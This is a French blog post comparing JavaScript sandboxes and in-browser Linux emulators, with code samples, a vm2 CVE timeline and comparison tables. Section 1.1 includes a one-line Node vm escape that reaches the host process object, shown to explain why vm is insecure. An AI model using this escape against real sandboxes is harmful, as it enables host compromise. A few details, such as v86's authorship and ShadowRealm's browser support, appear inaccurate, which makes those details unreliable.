---
title: Comparaison des solutions JavaScript pour la simulation de noyaux Linux
description: Une analyse approfondie des reconstitutions d'environnements Linux
  en JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "XB4UbBQx8MGFonndWgtkvw35wcrGKIJc9SbXZGWiCUN5NtoEFamy5X89JhP7eaU9EWN9ZniAul87TzFZn7YgyQ=="
---

# Chaque sandbox JavaScript, émulateur, simulateur et honeypot Linux -- comparé

Bon, alors ça fait un moment que je suis bien trop loin dans ce terrier de lapin lol. Tout a commencé parce que j'aidais sur [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- un projet de Fortune (j'y reviens dans un instant) -- et on me demandait tout le temps "attends, c'est quoi la différence avec `v86` ?" ou "pourquoi ne pas utiliser `vm2` ?" -- et je me suis rendu compte que je pouvais pas donner une réponse claire sans cartographier tout l'écosystème d'abord. Donc voilà, on y est je suppose xD

Il s'avère qu'il y a quatre familles distinctes -- les bacs à sable JS, les émulateurs Linux, les simulateurs Linux, et les honeypots -- et elles ne se chevauchent quasiment jamais, même si on les mentionne constamment dans la même phrase. Quelqu'un qui construit un système de plugins utilise `isolated-vm`. Quelqu'un qui fait une démo d'outil CLI utilise `v86`. Quelqu'un qui fait du renseignement de menaces SSH utilise Cowrie. Ils résolvent des problèmes complètement différents sous le même vague parapluie de "faire tourner du code dans une boîte."

J'ai passé beaucoup de temps à lire du code source, des rapports CVE, des docs d'architecture et des pages npm pour écrire cet article. Ça va être long -- prends un café, sérieusement. Ou deux.

> Petit disclaimer : `typescript-virtual-container` est mis en avant dans cet article parce que c'est ce qui a déclenché cette recherche. J'ai essayé d'être équitable envers tout le reste, mais garde ce contexte en tête.

---

## Partie 0 -- D'abord, quel problème est-ce que tu résous vraiment ?

Avant de plonger, ça vaut le coup d'être précis sur l'utilité de chaque famille, parce que la terminologie devient vite brouillonne et les gens mélangent tout constamment (moi y compris, avant que je m'assoie et que je cartographie tout proprement).

**Les bacs à sable JS** isolent du code JavaScript du processus Node.js hôte. Le modèle de menace c'est : du code JS non fiable qui pourrait appeler `process.exit()`, lire des fichiers, ou lancer des processus enfants. La solution est une frontière autour de l'exécution V8. Ces outils n'ont aucune notion d'un shell Linux, d'un système de fichiers avec des permissions, ou de SSH.

**Les émulateurs Linux** font tourner un vrai noyau Linux non modifié dans un émulateur CPU (x86, RISC-V, OR1K) implémenté en JavaScript ou WebAssembly. Tu démarres un vrai OS. Tu as de vrais appels système. Tu as la compatibilité binaire avec les programmes compilés pour x86. Le coût en ressources est énorme.

**Les simulateurs Linux** imitent le *comportement* d'un système Linux sans faire tourner un vrai noyau. Ils implémentent un interpréteur de shell, un système de fichiers virtuel, et assez de sémantique Unix pour tromper les programmes et les humains. Pas de noyau. Pas de Wasm. Pas d'émulation CPU. Beaucoup moins de ressources.

**Les honeypots** sont conçus pour attirer les attaquants et enregistrer ce qu'ils font. Ce ne sont pas principalement des environnements d'exécution -- ce sont des outils d'observabilité. La fidélité au comportement réel de Linux importe seulement dans la mesure où elle empêche l'attaquant de détecter le piège.

Avec ce cadre, voici où chaque projet de cet article se situe :

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Émulateur Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulateur Linux : typescript-virtual-container (unique dans cet espace)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (pas un isolateur, mais connexe)
```

---

## Partie 1 -- Les bacs à sable JavaScript

### 1.1 `vm` -- le module natif de Node.js (pas ce que tu crois)

La réponse la plus ancienne à "exécuter du JS non fiable" dans Node est le module natif `vm`. Il existe depuis la v0.1, donc beaucoup de gens l'utilisent en premier -- et se font brûler.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Ce que `vm` fait réellement : il crée un nouveau contexte V8 (un nouvel ensemble de constructeurs natifs -- `Object`, `Array`, `Function`, etc.) et exécute du code dedans, avec une référence partagée vers ce que tu mets dans `sandbox`. Ton moteur V8 ne change pas. Ton processus ne change pas. La mémoire est partagée.

La raison pour laquelle `vm` n'offre aucune sécurité : la chaîne de prototypes de JavaScript est un DAG qui connecte tout à `Object.prototype`. Si tu mets un objet du monde hôte dans le bac à sable, l'invité peut remonter sa chaîne de prototypes et atteindre les constructeurs hôtes. Depuis `Function`, tu peux appeler `Function("return process")()` et récupérer le vrai `process`. Game over. Comme, immédiatement.

```js
// Ça fonctionne parfaitement dans vm -- tu récupères le vrai process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Je veux dire, la documentation de Node.js elle-même dit : "Le module vm n'est pas un mécanisme de sécurité. Ne l'utilisez pas pour exécuter du code non fiable." Cet avertissement est là depuis toujours. Les gens l'ignorent constamment. J'ai vu des applications en production utiliser `vm` comme bac à sable. S'il te plaît, ne fais pas ça xD

**Verdict** : un mécanisme de portée, pas un bac à sable. Utilise-le quand tu as besoin d'isoler des variables (moteurs de templates, fonctionnalités de type `eval` où tu contrôles le code). Jamais pour des entrées non fiables.

**Mémoire** : surcharge négligeable -- même tas V8 que le processus hôte.  
**Sécurité** : aucune contre un attaquant motivé.

---

### 1.2 `vm2` -- la tentative communautaire, et sa très longue mort

`vm2` était la réponse de la communauté au problème d'évasion de `vm`. L'idée centrale : envelopper chaque objet qui franchit la frontière du bac à sable dans un `Proxy` qui intercepte les accès aux propriétés, bloque la remontée de prototypes, et filtre les références dangereuses. Idée intelligente en théorie ! Pas tellement en pratique, comme on va le voir.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // lance VMError, process inaccessible
```

Pendant plusieurs années, ça a plutôt bien fonctionné. Mais la surface d'attaque des `Proxy` JavaScript est énorme. Chaque nouvelle fonctionnalité du langage JS -- générateurs, itérateurs asynchrones, `Symbol.toPrimitive`, `Error.prepareStackTrace`, les emplacements internes de `Promise` -- est un vecteur de contournement potentiel.

La chronologie des CVE est... quelque chose. Genre, regarde ça :

| Date | CVE | Mécanisme |
|------|-----|-----------|
| Oct 2022 | CVE-2022-36067 | Évasion du contexte hôte via `Error.prepareStackTrace` |
| Avr 2023 | CVE-2023-29017 | Fuite d'objet hôte via erreur async non gérée |
| Avr 2023 | CVE-2023-29199 | Contournement de l'assainissement des exceptions via `handleException()` |
| Avr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mai 2023 | CVE-2023-32314 | `Proxy` sur `Error.name` → `Function` → RCE |
| Jui 2023 | CVE-2023-37466 | Fonction async + débordement de pile + `Proxy.getPrototypeOf` |
| Jui 2023 | CVE-2023-37903 | Worker thread + évasion par eval |

Trois CVE critiques le même mois (avril 2023). TROIS. EN UN MOIS. Après CVE-2023-37903, le mainteneur a officiellement déprécié la bibliothèque avec le message : *"La bibliothèque contient des problèmes de sécurité critiques et ne devrait pas être utilisée en production."*

Le mainteneur l'a ressuscitée en octobre 2025 avec la version 3.10.0, prétendant avoir corrigé tout ce qui était connu à l'époque. Une nouvelle évasion critique (CVE-2026-22709, CVSS 9.8) a été divulguée en janvier 2026, suivie d'un lot de onze autres en mai 2026. Onze. Le schéma n'a pas changé et honnêtement je ne pense pas qu'il changera un jour.

Le problème fondamental est architectural -- et c'est la leçon qu'il a fallu un moment à tout l'écosystème pour apprendre. Tu ne peux pas construire un bac à sable sécurisé en utilisant le même langage que tu isoles, sur le même moteur, dans le même processus. La surface d'évasion, c'est l'implémentation entière de V8 -- et V8 fait plusieurs millions de lignes de C++ qui changent constamment. Chaque nouvelle fonctionnalité JS ouvre potentiellement une nouvelle voie d'attaque.

**Verdict** : Ne pas utiliser pour des applications sensibles à la sécurité. Même sur la dernière version, de nouveaux contournements sont découverts tous les quelques mois. Le mainteneur lui-même l'a reconnu ouvertement.

---

### 1.3 `isolated-vm` -- celui qui marche vraiment

`isolated-vm` adopte la bonne approche : utiliser la primitive d'isolation native de V8, l'Isolate. Chaque Isolate V8 a son propre tas, son propre ramasse-miettes, son propre ensemble de natifs, et zéro référence partagée avec les autres Isolates.

C'est la même frontière que Chrome utilise entre les onglets. C'est une vraie barrière de sécurité, pas une astuce de langage construite sur des Proxy.

```js
import ivm from "isolated-vm";

// Chaque isolate est son propre tas V8
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // limite en MB
const context = await isolate.createContext();
const jail = context.global;

// Passer des données à travers la frontière nécessite une sérialisation explicite
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Ne peut pas atteindre le processus hôte, le tas hôte ou les modules hôtes
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Tu peux terminer brutalement sur timeout ou limite mémoire
isolate.dispose(); // libère tout le tas
```

Les types `Reference` et `ExternalCopy` sont le pont de communication explicite. Une `Reference` donne à l'isolate un handle appelable vers une fonction hôte -- l'isolate peut l'appeler mais ne peut pas inspecter sa fermeture ou son prototype. Un `ExternalCopy` sérialise une valeur (clone structuré) à travers la frontière du tas. Ce modèle de pont explicite n'est pas pratique, mais c'est ce qui rend l'isolation réelle.

Tu peux définir des limites de ressources strictes : mémoire (l'isolate est terminé s'il dépasse la limite), timeout horloge murale, et timeout CPU. La terminaison est réelle -- elle tue tout l'Isolate V8, pas juste un timeout JS qui peut être contourné avec un `while(true)`.

**Limites** : c'est JS uniquement. Tu ne peux pas exécuter bash dedans. Il n'y a pas de notion de fichiers, de permissions, de réseau ou de processus. C'est exactement le bon outil pour du JS soumis par l'utilisateur (plugins, formules, hooks de script), et le mauvais outil pour tout le reste. L'autrice de `typescript-virtual-container` a mentionné qu'elle l'avait envisagé au début avant de réaliser qu'"exécuter des commandes shell" et "isoler du JavaScript" sont des problèmes fondamentalement différents.

**Mémoire** : ~3-10 Mo par isolate vide, augmente avec l'utilisation du tas.  
**Sécurité** : solide. La frontière V8 Isolate est la vraie primitive d'isolation.  
**npm** : [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub** : [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- un moteur JS séparé compilé en Wasm

Une approche différente : au lieu d'isoler dans V8, faire tourner un moteur JavaScript complètement séparé compilé en WebAssembly. L'hôte tourne dans V8/Node. L'invité tourne dans QuickJS-dans-Wasm. Le bac à sable Wasm fournit la frontière d'isolation.

QuickJS est encore une œuvre de Fabrice Bellard (le même gars derrière QEMU, FFmpeg, JSLinux, TinyEMU -- cette personne n'est pas réelle, sérieusement, comment est-ce qu'une seule personne fait tout ça ?). C'est un petit moteur JS conforme à la norme ES2023 écrit en C, et compilé en Wasm il ne fait qu'environ 500 Ko.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // S'exécute dans QuickJS, complètement séparé de V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS est un petit moteur JavaScript conforme à ES2023 écrit en C. Compilé en Wasm, il fait environ 500 Ko pour la variante synchrone, ~1 Mo pour la variante asynchrone (Asyncify). La gestion de la mémoire est manuelle -- chaque valeur que tu extrais de la VM doit être explicitement libérée, ce qui est un peu chiant mais empêche les surprises de GC inter-frontières. Un compromis amusant !

Le wrapper `@sebastianwessel/quickjs` ajoute une API plus ergonomique par-dessus, avec un système de fichiers virtuel optionnel, le support fetch, et des stubs de modules Node.js :

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Le modèle de sécurité est différent de `isolated-vm` : le modèle mémoire linéaire de Wasm fait que l'invité ne peut pas accéder directement aux objets du tas V8. La surface d'attaque est l'interface hôte↔Wasm (imports/exports), pas tout le langage JS. C'est généralement considéré comme plus robuste que les bacs à sable basés sur Proxy.

Le revers : QuickJS n'a pas le même niveau d'optimisation que V8. Pour les charges CPU-bound en JS, c'est 5 à 20 fois plus lent que V8. Pour des petits bouts de code et des évaluations non fiables, ça n'a généralement pas d'importance.

**Mémoire** : ~500 Ko module Wasm + tas par instance.  
**Sécurité** : frontière Wasm, considérée plus solide que les approches basées Proxy.  
**npm** : [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub** : [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- un runtime qui met les permissions en premier

Deno adopte une philosophie complètement différente : au lieu de faire du bac à sable dans Node, construire un nouveau runtime qui est sécurisé par défaut. J'aime vraiment cette approche -- c'est ce que Node.js aurait dû être depuis le début, honnêtement. Ryan Dahl (le créateur original de Node.js) a littéralement créé Deno parce qu'il regrettait certaines décisions de conception de Node.js, ce qui est assez fou quand on y pense.

Chaque capacité sensible (lecture fichier, écriture fichier, réseau, environnement, sous-processus) nécessite un flag `--allow-*` explicite :

```bash
# Celui-ci peut seulement lire dans /data, rien d'autre
deno run --allow-read=/data script.ts

# Celui-ci peut seulement accéder à un seul domaine
deno run --allow-net=api.example.com script.ts

# Pas de flags = aucune permission
deno run untrusted.ts # peut pas lire, écrire, réseau, lancer
```

Le modèle de permissions est implémenté au niveau Rust/OS -- ce n'est pas une astuce JS. Quand du code Deno appelle `Deno.readFile()`, ça passe par une opération Rust qui vérifie la table de permissions avant de toucher au système de fichiers. Tu ne peux pas le contourner depuis JS parce que l'appel système n'a jamais lieu si la permission n'est pas accordée.

Pour exécuter du code vraiment non fiable, les Workers Deno (Web Workers) fournissent un second isolate dans le même processus, chacun avec son propre ensemble de permissions. Tu peux lancer un worker avec zéro permission et communiquer avec lui via `postMessage`.

Deno 2 (sorti en octobre 2024) a ajouté la compatibilité npm complète et des shims de compatibilité Node.js, ce qui a considérablement amélioré son adoption pour les cas d'usage côté serveur.

**Le compromis** : le modèle de sécurité de Deno est excellent pour du code auquel tu pourrais faire partiellement confiance. Pour du code complètement non fiable qui pourrait être adversarial, le modèle de permissions n'aide pas -- tu as besoin d'une frontière Isolate (`isolated-vm`) ou d'un moteur différent (`quickjs-emscripten`), parce que Deno utilise toujours V8 et des attaquants sophistiqués peuvent trouver des bugs au niveau V8.

---

### 1.6 TC39 ShadowRealm -- la réponse standardisée (un jour)

L'organisme de normalisation JavaScript (TC39) a une proposition appelée ShadowRealm qui tente de standardiser ce que `vm` et `vm2` essayaient de faire, mais avec un modèle de sécurité correct. Un ShadowRealm crée un contexte d'exécution JS isolé avec ses propres intrinsèques, aucun accès au royaume extérieur, et une interface d'import/export soigneusement contrôlée.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Intrinsèques séparés, pas d'accès au royaume extérieur
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm est disponible dans les navigateurs (Chrome 90+, Firefox 105+) mais n'est pas encore dans Node.js stable en 2026. La proposition TC39 Compartments s'appuie dessus pour l'isolation au niveau des modules. Ce sont les réponses standardisées à long terme, mais elles ne sont pas encore prêtes pour la production côté serveur Node. C'est un de ces trucs où tu vois arriver de loin mais... c'est juste pas encore là. Du grand classique TC39 xD

---

### Résumé de la famille des bacs à sable

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Frontière d'isolation** | aucune (portée) | Proxy (cassé) | V8 Isolate | Wasm | V8 Isolate + perms Rust |
| **Limite mémoire** | ❌ | ❌ | ✅ limite stricte | ✅ tas Wasm | partielle |
| **Timeout CPU** | ❌ | ✅ (contournable) | ✅ strict | ✅ | ✅ |
| **Sécurité** | aucune | cassée | solide | solide | solide |
| **Vitesse JS** | V8 natif | V8 natif | V8 natif | ~10x plus lent | V8 natif |
| **Navigateur** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Compatibilité Node** | natif | ✅ | ✅ | shims partiels | partielle |
| **Statut** | stable | risqué (nouvelles CVE) | ✅ actif | ✅ actif | ✅ actif |
| **Surcharge RAM** | ~1 Mo | ~5-20 Mo | ~3-10 Mo | ~5-15 Mo | ~10-30 Mo |

Le verdict : si la sécurité t'importe, il y a exactement deux vraies options -- `isolated-vm` (extension native, V8 Isolate, pleine vitesse JS) et `quickjs-emscripten` (Wasm, compatible navigateur, ~10x plus lent pour du calcul intensif). Tout le reste est soit "s'il te plaît ne fais pas ça" (`vm`, `vm2`) soit un runtime qui résout un problème complètement différent (Deno). ShadowRealm pourrait changer la donne un jour, mais ce n'est pas encore le cas.

---

## Partie 2 -- Les émulateurs Linux en JavaScript

C'est là que les choses deviennent vraiment intéressantes pour moi. Ce sont de *vrais* émulateurs -- ils implémentent un jeu d'instructions CPU en JavaScript ou WebAssembly, démarrent une vraie image de noyau Linux, et exécutent de vrais binaires utilisateur. L'isolation vient du fait que l'invité et l'hôte ne partagent rien : des espaces mémoire différents, des flux d'instructions différents.

Le prix à payer est énorme, mais ce que tu obtiens est vraiment remarquable : du vrai Linux, qui tourne vraiment, dans ton navigateur ou ton processus Node. Genre, c'est assez fou quand on y pense, non ?

### 2.1 `v86` -- émulateur PC x86 en JS + JIT Wasm

`v86` par Fabrice (copy sur GitHub) est l'émulateur x86 open-source le plus capable en JavaScript. Il a commencé comme un interpréteur JS pur vers 2013 et a évolué vers un système JIT où les blocs de base x86 sont traduits en WebAssembly à la volée, améliorant considérablement les performances.

Ce qu'il émule :
- **CPU** : x86-32 (IA-32), jeu d'instructions environ au niveau Pentium 1. Pas de 64-bit (x86-64) -- c'est une limite architecturale matérielle, pas une fonctionnalité manquante.
- **FPU** : via `Float64Array` de JavaScript. Le x87 est en précision étendue 80-bit ; les doubles JS sont en 64-bit. Ça signifie que les résultats en virgule flottante peuvent différer légèrement d'un vrai CPU.
- **Mémoire** : configurable, mappe vers un `SharedArrayBuffer` ou `ArrayBuffer` dans le tas JS.
- **Matériel** : 8254 PIT (timer), 8259 PIC (contrôleur d'interruptions), contrôleur clavier 8042 (PS/2), CMOS RTC, VGA avec extensions SVGA et Bochs VBE, contrôleur IDE, contrôleur disquette (8272A), carte réseau NE2000.
- **BIOS** : utilise SeaBIOS (BIOS x86 open-source).

Le JIT fonctionne en identifiant des blocs de base (séquences d'instructions x86 sans sauts), en les traduisant en une fonction WebAssembly, en mettant cette fonction en cache, et en l'appelant lors des exécutions suivantes du même bloc. Les chemins de code chauds obtiennent des performances Wasm natives. Les chemins froids retombent sur l'interpréteur JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 Mo
  autostart: true,
});

// Capturer la sortie série (console noyau Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Envoyer une entrée à l'invité (taper dans le shell)
emulator.serial0_send("ls /\n");
```

**OS supportés** : Alpine Linux (excellent), Ubuntu 16.04/18.04 (i386 uniquement), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (avec des réserves), MS-DOS.

**Temps de démarrage** : 15-40 secondes pour Alpine Linux depuis une image propre. C'est inhérent à l'initialisation réelle du noyau -- tu ne peux pas la sauter. Oui, tes utilisateurs vont regarder un noyau Linux démarrer dans leur navigateur. C'est le deal xD

**Mémoire minimum** : 100-256 Mo par instance. Le seul cache de code Wasm JIT peut atteindre des dizaines de Mo pour une instance Linux occupée.

**Utilisation dans Node.js** : entièrement supporté. Pas besoin de DOM -- la sortie VGA peut être ignorée si tu ne t'intéresses qu'à la sortie série.

**Ce que tu ne peux pas faire** : exécuter des binaires 64-bit, utiliser des fonctionnalités modernes du noyau (eBPF, io_uring, etc.), ou faire tourner plus d'une poignée d'instances simultanément sans atteindre les limites mémoire.

**npm** : [v86](https://www.npmjs.com/package/v86) -- mis à jour continuellement, dernière publication le jour même au moment où j'écris.  
**GitHub** : [copy/v86](https://github.com/copy/v86)  
**Démo** : [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux et TinyEMU -- le travail de Bellard, en deux fois

JSLinux est le propre émulateur Linux en JavaScript de Fabrice Bellard -- le tout premier, publié en 2011. Je continue de mentionner Bellard dans cet article parce qu'il n'arrête pas de réapparaître : QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Ce gars est quelque chose d'autre. Vraiment l'une des contributions techniques individuelles les plus impressionnantes de l'histoire du logiciel, sans exagération.

Le JSLinux original était un interpréteur x86 pur JS. En 2016, Bellard a écrit TinyEMU (un émulateur RISC-V en C), l'a compilé en JavaScript via Emscripten, et ça est devenu la base du JSLinux actuel. Donc le JSLinux actuel est en fait du code C qui génère du JavaScript -- pas du tout du JS écrit à la main.

Les notes techniques sur le site de Bellard valent la peine d'être lues : le JSLinux actuel fait tourner un CPU RISC-V 32 ou 64-bit (pas x86), émulant une console VirtIO, un réseau VirtIO, un périphérique bloc VirtIO, et un système de fichiers 9P pour le partage de fichiers avec l'hôte. La démo JS est compilée à partir de C en utilisant Emscripten -- ce n'est pas du JS écrit à la main.

TinyEMU lui-même supporte :
- RISC-V RV32IMAFDQC et RV64IMAFDQC (32 et 64-bit, avec virgule flottante, multiplication, instructions compressées)
- x86 via KVM (natif uniquement, pas d'émulation -- donc la version JS est RISC-V uniquement)
- Console VirtIO, réseau, bloc, entrée, système de fichiers 9P

TinyEMU a une démo JavaScript fournie via Emscripten. C'est la base de JSLinux et c'est aussi utilisé par `container2wasm` (voir section 2.5).

**Statut JSLinux** : pas de package npm, pas d'API programmable. C'est une démo que tu ouvres dans ton navigateur. L'importance historique est grande -- ça a prouvé le concept. L'utilité pratique en tant que bibliothèque : nulle.

**TinyEMU** : pas sur npm, source C disponible sur [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- émulateur OR1K

jor1k est un émulateur OpenRISC 1000 (OR1K) écrit en JavaScript par Sebastian Macke. C'est intéressant historiquement parce que jor1k a introduit le support du système de fichiers VirtIO 9P, que Bellard a ensuite intégré dans TinyEMU et JSLinux. La pollinisation croisée entre ces projets est serrée -- ils s'empruntent tous des trucs les uns aux autres, ce qui est honnêtement l'une des choses les plus cool du travail d'émulation open-source.

**Statut** : plus maintenu activement, pas de package npm. Archivé à ce stade. Utile à connaître surtout pour le contexte historique -- genre si quelqu'un mentionne jor1k dans une conversation, maintenant tu sais ce que c'est :)

---

### 2.4 CheerpX -- émulateur x86 commercial pour le navigateur

CheerpX par Leaning Technologies est l'émulateur Linux x86 commercial de qualité production. Il n'est pas open-source, mais il est nettement plus capable que v86 pour faire tourner un vrai userspace Debian/Ubuntu. Si tu as besoin d'un vrai VSCode dans le navigateur, c'est ce qu'il te faut.

Différences clés avec v86 :
- Supporte un ISA plus large (plus d'extensions x86, meilleure compatibilité glibc)
- Système de fichiers basé sur IndexedDB dans le navigateur (persistant entre les rechargements de page)
- Support pthread via `SharedArrayBuffer` (qui nécessite les en-têtes COOP/COEP -- oui ces en-têtes de sécurité embêtants)
- Conçu pour faire tourner VSCode, Python, Node.js, et d'autres applications réelles -- pas seulement des images OS minimales
- Support professionnel et SLA disponible (aka tu peux engueuler quelqu'un si ça casse)

Le cas d'usage typique est "faire tourner une vraie application Linux dans le navigateur sans serveur." Des entreprises l'utilisent pour des IDE basés navigateur, des tutoriels de codage, et de la documentation interactive.

```js
// API CheerpX (simplifiée)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Histoire avec Node.js** : CheerpX est d'abord conçu pour le navigateur. L'émulateur sous-jacent pourrait théoriquement fonctionner dans Node (c'est du Wasm), mais l'API et la documentation sont entièrement orientées vers une utilisation navigateur. L'utilisation côté serveur n'est pas supportée.

**Mémoire** : similaire à v86 -- 200+ Mo pour une vraie instance Debian.  
**Tarification** : gratuit pour les projets open-source, licence commerciale pour SaaS en production.  
**Docs** : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js en Wasm, pas de l'émulation Linux

Les WebContainers sont souvent mis dans le même sac que les émulateurs Linux mais sont architecturalement différents. Ils n'émulent pas x86. Ils ne démarrent pas Linux. Ils font tourner Node.js compilé en WebAssembly en utilisant WASI. Cette distinction compte beaucoup et j'ai passé bien trop de temps à être confus à ce sujet lol.

Je pense que la confusion vient du marketing -- "faire tourner Node.js dans ton navigateur" ressemble à de l'émulation, mais c'est en fait Node.js lui-même compilé en Wasm, pas une émulation Linux qui fait tourner Node.js dans une VM. Un truc complètement différent.

L'architecture :
1. Node.js est compilé en Wasm (un runtime WASI personnalisé spécifiquement)
2. Un Service Worker intercepte les requêtes réseau du serveur Node.js émulé et les route vers l'onglet du navigateur
3. Le système de fichiers vit dans la mémoire du navigateur (pas d'E/S disque)
4. npm est une implémentation personnalisée optimisée pour une utilisation dans le navigateur

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Écrire des fichiers
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Exécuter des commandes Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Comme ça exécute du vrai Node.js (compilé en Wasm), tu as un vrai npm, de vraies API Node.js, et une vraie résolution de modules. Tu n'as pas un userspace Linux généraliste -- tu ne peux pas installer de paquets système avec `apt`, exécuter des binaires compilés arbitraires, ou faire grand-chose en dehors de l'écosystème Node.js.

**Prérequis navigateur** : SharedArrayBuffer (nécessite les en-têtes COOP/COEP), support Service Worker, Wasm moderne.

**Histoire avec Node.js** : conçu exclusivement pour une utilisation navigateur. L'API ne fonctionne pas en dehors d'un contexte navigateur.

**npm** : [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Docs** : [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- des conteneurs Docker compilés en Wasm

`container2wasm` est un outil (pas un package npm) de NTT qui prend une image de conteneur Docker et la convertit en un binaire WebAssembly qui peut tourner dans n'importe quel hôte Wasm -- y compris un navigateur. Quand j'ai vu ça pour la première fois, je n'ai vraiment pas cru que ça marchait.

Le mécanisme :
- Pour les conteneurs x86_64 : embarque Bochs (un émulateur x86, compilé en Wasm) + le système de fichiers racine du conteneur
- Pour les conteneurs riscv64 : embarque TinyEMU (encore Bellard !) + le système de fichiers racine du conteneur
- Le fichier `.wasm` résultant démarre l'émulateur, monte le système de fichiers du conteneur, et exécute le point d'entrée du conteneur

```bash
# Convertir un conteneur Ubuntu 22.04 en Wasm
c2w ubuntu:22.04 out.wasm

# L'exécuter
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Ou le servir pour une utilisation navigateur
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Le `.wasm` résultant est volumineux -- une Ubuntu minimale fait plusieurs centaines de Mo -- mais il est complètement autonome. Tu peux envoyer un `.wasm` par email à quelqu'un et il peut faire tourner Ubuntu dans son navigateur. Cette phrase ne devrait pas avoir de sens mais nous y voilà.

**GitHub** : [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Résumé de la famille des émulateurs

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Architecture** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (propriétaire) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Vrai noyau** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Package npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (outil CLI) |
| **Utilisation Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (navigateur only) | via Wasmtime |
| **Utilisation navigateur** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instance** | 150-256 Mo | ~64-128 Mo | ~64 Mo | 200+ Mo | ~100 Mo | ~200-500 Mo |
| **Temps démarrage** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | partiel | ✅ |
| **Statut** | ✅ très actif | ✅ stable | ⚠️ archivé | ✅ commercial | ✅ actif | ✅ actif |

